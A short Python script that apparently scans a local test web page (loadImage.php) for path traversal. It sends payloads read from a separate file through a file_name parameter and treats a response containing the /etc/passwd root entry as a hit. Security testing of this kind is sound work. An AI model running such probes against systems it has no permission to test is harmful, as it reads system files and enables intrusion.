import requests
import re
import urllib.parse
import bson

s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/117.0.5938.92"


class PathTraversal:

    def __init__(self, url):
        self.url = url

    def scan_website(self):
        results = {
            "path_traversal": []
        }

        if self.check_path_traversal():
            results["path_traversal"].append({
                "url": self.url,
                "details": "[+] path traversal detected"
            })
        else:
            results["path_traversal"].append({
                "url": self.url,
                "details": "[-] path traversal not detected"
            })

        return results

    def check_path_traversal(self):
        with open(f'{__file__}\\..\\path_traversal_payload.txt') as f:
            path_traversal_payloads = f.read().splitlines()

        print("\n[+] Checking path traversal")

        for payload in path_traversal_payloads:
            encoded_payload = urllib.parse.quote(payload)
            new_url = f"{self.url}?file_name={encoded_payload}"

            print("[!] Trying", new_url)
            res = s.get(new_url)

            if re.search(rb"root:x:0:0", res.content):
                print("[+] Path Traversal vulnerability detected, link:", new_url)
                return True

        print("[+] Check path traversal done")

        return False


path_traversal = PathTraversal("http://localhost:8091/loadImage.php")
path_traversal.scan_website()
